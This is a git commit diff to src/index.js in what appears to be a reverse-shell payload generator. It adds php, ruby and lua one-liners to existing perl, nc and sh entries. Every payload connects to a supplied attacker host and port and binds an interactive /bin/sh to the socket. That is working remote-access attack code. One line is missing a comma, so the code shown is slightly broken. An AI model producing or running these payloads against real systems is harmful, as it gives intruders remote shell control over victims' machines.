c193089c692f6bba74086c6091c014f905b91d4e
Lz1y <1163262671@qq.com>
2018-05-11 15:30:50 +0800

    Update index.js

--- src/index.js
+++ src/index.js
@@ -17,6 +17,10 @@ const generateScript = (host, port) => {
 		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
 		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
 		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
+		php: `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+		ruby: `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+		lua: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${host}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
+			
 	};
 
 	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
